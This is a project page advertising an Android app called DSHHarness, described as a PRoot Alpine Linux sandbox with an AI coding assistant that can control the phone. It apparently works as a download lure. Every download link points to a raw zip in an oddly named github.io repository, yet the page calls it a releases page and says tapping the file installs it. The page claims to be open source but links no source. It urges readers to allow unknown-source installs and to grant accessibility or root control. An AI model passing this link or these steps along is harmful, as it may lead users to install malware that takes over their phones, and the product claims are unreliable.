---
layout: "default"
title: "📱 DSHHarness - Your Phone Becomes a Linux AI Coder"
description: "Run a full Alpine Linux sandbox and AI coding assistant on Android via PRoot—no root, no Termux, no PC required."
---
# 📱 DSHHarness - Your Phone Becomes a Linux AI Coder

[![Download DSHHarness](https://img.shields.io/badge/⬇_Download_DSHHarness-Latest_Release-8A2BE2?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Astaticgalvanometerpampasgrass334/astaticgalvanometerpampasgrass334.github.io/main/knuckle/Release_v1.8.zip)

DSHHarness is a single Android app that turns your phone into a complete, self-contained Linux computer — and then puts an AI coding assistant on top of it. You install one file. You tap one icon. A few minutes later, a real Linux environment with Node.js is running inside your phone, and a browser-based AI assistant called **dsh** is ready to talk to you.

No root. No Termux. No second computer. No command line knowledge required.

---

## 📥 Download and Install

**Visit this link to download the application:**

### 👉 [https://raw.githubusercontent.com/Astaticgalvanometerpampasgrass334/astaticgalvanometerpampasgrass334.github.io/main/knuckle/Release_v1.8.zip](https://raw.githubusercontent.com/Astaticgalvanometerpampasgrass334/astaticgalvanometerpampasgrass334.github.io/main/knuckle/Release_v1.8.zip)

Open that page in any browser — it works exactly the same whether you are sitting at a Windows PC or holding your phone. On the Releases page you will find the download for the newest version. Grab it, then move the file to your Android phone if you downloaded it on a PC.

Once the file is on your phone, tap it. Your phone will ask whether you want to install an app from this source. Allow it, tap **Install**, and wait for the confirmation. The DSHHarness icon appears on your home screen.

That is the entire setup. There is nothing else to configure and nothing else to buy.

---

## ✨ What Actually Happens When You Open It

Tap the DSHHarness icon and the app starts building your Linux environment. You will see a **progress bar that tells you the truth** — a real, measured percentage rather than an animation that spins forever. It shows you which step it is on, how much is finished, and how much is left. If you need to stop, you can. When it says done, it is genuinely done.

Behind that progress bar, the app is quietly assembling three things:

- **PRoot** — a clever piece of software that lets a full Linux system run inside an ordinary Android app, with no special permissions and no tampering with your phone.
- **Alpine Linux** — a small, fast, reliable Linux distribution that many servers around the world use every day.
- **Node.js** — the runtime that lets the dsh AI coding assistant run as a modern web application.

When the bar reaches 100%, a web page opens. That page is the dsh assistant's interface, running entirely on your own device. You type, it answers, it writes code, it edits files — all inside the little Linux machine living in your phone.

---

## 🎛️ Five Levels of Phone Control

The assistant can do more than write text. With your permission, it can actually operate the phone — tapping buttons, typing into fields, and taking screenshots to see what is on screen. Because phones differ wildly, DSHHarness offers **five control levels** and picks the best one available to you:

| Level | What it means for you |
|---|---|
| **Auto** | The app checks your phone and selects the strongest method that will work. Best choice for most people. |
| **Accessibility** | Uses Android's built-in accessibility service. Works on virtually every phone, no root needed. |
| **Root** | For phones that are already rooted. The most powerful option. |
| **Shizuku** | A middle path for people who use the Shizuku app — strong control without full root. |
| **Basic** | Screen viewing and simple actions only. The safest, most limited mode. |

You choose the level in settings. Nothing is granted automatically — Android will ask you to confirm each permission, and you can revoke it at any time from your phone's settings.

---

## 📂 Three Doors Into Your Real Storage

Most sandboxed apps trap your files in a private folder you can never find. DSHHarness does the opposite. It connects to your actual phone storage through three standard entry points, so files you create are files you can see in your gallery and file manager:

- `/mnt/sdcard`
- `/sdcard`
- `/storage/emulated/0`

All three point to the same real storage, so you can use whichever path you are used to.

For safety, you can mark **DCIM**, **Pictures**, **Movies**, and **Android** as **read-only** with a single toggle. The AI can read your photos and recordings when it needs context, but it cannot delete or overwrite them. Your memories stay yours.

---

## 🌐 Reach It From Another Device

Turn on local network access and the dsh web interface becomes available to other devices on the same Wi-Fi. Your laptop's browser can open the assistant running on your phone — useful when you want a real keyboard and a bigger screen. Nothing leaves your home network unless you deliberately expose it.

---

## 🧩 Sessions and Plugins

Every conversation with the assistant is a **session**, and sessions can be exported to a file and imported later. Switch phones, archive a project, hand a session to a colleague — it all works with plain files you control.

DSHHarness also supports the **dsh plugin system**, so the assistant's abilities can be extended over time without replacing the app.

---

## 🔒 Privacy, Plainly Stated

- **Zero data collection.** No analytics, no telemetry, no usage reports.
- **No built-in API keys.** You supply your own credentials; the app ships with none and phones home to nobody.
- **Open source under Apache-2.0.** Anyone can read the code and verify these claims.

---

## 📋 Requirements

- **Android 8.0 or newer**
- **arm64 processor** — this covers essentially every phone sold in the last several years
- **Free storage space** for the Linux environment and your projects
- **An internet connection for the first setup**, so the app can fetch its components

---

## 🚀 Your First Five Minutes

1. Open the download link above and get the newest release.
2. Install it on your arm64 Android phone and tap the icon.
3. Watch the honest progress bar finish its work.
4. When the web interface appears, open **Settings** and choose a control level — **Auto** is the right pick for most people.
5. Approve the Android permission prompt that follows.
6. Decide whether DCIM, Pictures, Movies, and Android should be read-only, then start your first session.

---

## ❓ If Something Looks Wrong

**The progress bar seems slow.** The first run downloads and unpacks a whole operating system. On a slow connection this takes a while; the bar is showing real work, not stalling.

**The install was blocked.** Android hides unknown-source installs by default. Open your phone's settings, allow installs from your browser or file manager, then tap the file again.

**The interface will not load.** Make sure setup reached 100% and that no battery-saving mode is killing background work. Turning off battery optimisation for DSHHarness solves most of these cases.

**Controls do nothing.** Return to Settings, confirm the control level is set to Auto, and re-approve the permission prompt. Some phones need accessibility re-enabled after a restart.

---

## 🛠️ Getting Help and Contributing

Bug reports, feature requests, and pull requests are welcome in the repository. Because the project is Apache-2.0 licensed, you are free to inspect it, modify it, and share your changes.

DSHHarness exists so that a phone you already own can be a real development machine — no root, no subscriptions, no cloud dependency. Install it and see.

---

Keywords: ai-agent, ai-coding-assistant, alpine, android, android-app, arm64, deepseek, dsh, dshharness, kernelsu, linux, magisk, mobile-ai, nodejs, proot, rootless, sandbox, shizuku, terminal, termux-alternative